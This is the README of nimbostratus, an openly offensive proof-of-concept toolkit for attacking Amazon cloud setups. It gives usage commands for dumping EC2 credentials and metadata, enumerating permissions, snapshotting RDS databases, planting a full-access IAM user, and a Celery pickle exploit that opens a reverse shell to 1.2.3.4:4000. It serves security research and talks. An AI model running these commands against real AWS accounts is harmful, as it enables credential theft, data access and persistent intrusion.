Nimbostratus
============

Tools for fingerprinting and exploiting Amazon cloud infrastructures. These tools are a PoC
which I developed for my "Pivoting in Amazon clouds" talk, developed using the great 
[boto](https://github.com/boto/boto) library for accessing Amazon's API.

Feel free to report bugs, fork and send pull-requests. You can also drop me a line at
[@w3af](https://twitter.com/w3af).

Installation
============

```bash
git clone git@github.com:andresriancho/nimbostratus.git
cd nimbostratus
pip install -r requirements.txt
```


Usage
=====

Providing AWS credentials
-------------------------

Some `nimbostratus` sub-commands require you to provide AWS credentials. They are
provided using the following command line arguments:

 * `--access-key`
 * `--secret-key`
 * `--token` , which is only used when the credentials were extracted from the instance profile.

Dump credentials
----------------

Identify the credentials available in this host and prints them out to the console.
This is usually the first command to run after gaining access to an EC2 instance.

```console
$ nimbostratus dump-credentials
...
```

Once you've got the credentials from an EC2 instance you've exploited, you can continue to work from any other
host with internet access (remember: EC2 instances are in many cases spawned for a specific work and then terminated).

*IMPORTANT*: This will extract information from `boto`'s credential configuration sources
and from the instance meta-data. If the system uses other libraries to connect to AWS
the credentials won't be dumped.


Dump permissions
----------------

This tool will dump all permissions for the provided credentials. This tool is commonly used
right after `dump-credentials` to know which permissions are available for you.

```console
$ nimbostratus dump-permissions --access-key=... --secret-key=...
...
```

Dump instance meta-data
-----------------------

All EC2 instances have [meta-data](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AESDG-chapter-instancedata.html)
which is accessible via [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/). This
tool will extract all the important information from the metadata and show it to you.

Keep in mind that each EC2 instance has his own `http://169.254.169.254/` meta-data
provider and running this command on different instances will yield different results.

```console
$ nimbostratus dump-ec2-metadata
...
```

Create DB snapshot
------------------

In some cases you've got Amazon credentials which allow you to access the [RDS](http://aws.amazon.com/rds/) API but
don't have any access to the database itself (MySQL user). This tool allows you to access the information stored in
that database by creating a snapshot and restoring it.

```console
$ nimbostratus snapshot-rds --access-key=... --secret-key=... --password=changeme --rds-name==db_name
...
```

Inject raw Celery message
-------------------------

Celery warns developers about the [insecure pickle](http://docs.celeryproject.org/en/latest/userguide/security.html#serializers)
serialization method, but of course you'll find deployments like this in real life. This tool will check if the instance
where this tool is being run has access to SQS, if that SQS has a Celery queue, verify that the Queue is using pickle and
finally inject a raw message that will execute arbitrary commands when un-pickled.

```console
$ nimbostratus celery-pickle-exploit --access-key=... --secret-key=... --queue-name=celery \
                                     --region=ap-southeast-1 --reverse=1.2.3.4:4000
...
```

Create new user
---------------

If you've got credentials which allow you to create a new user using [IAM](http://aws.amazon.com/iam/) this tool will
create it (with permissions to access all Amazon resources) and return API key and secret.

```console
$ nimbostratus create-iam-user --access-key=... --secret-key=...
...
```



What's a `nimbostratus` anyways?
================================

[nimbostratus](http://en.wikipedia.org/wiki/Nimbostratus_cloud) is a type of cloud, if you ever started a project you know how hard it is to name it... so I just chose something that sounded "cool" and was "cloud-related".
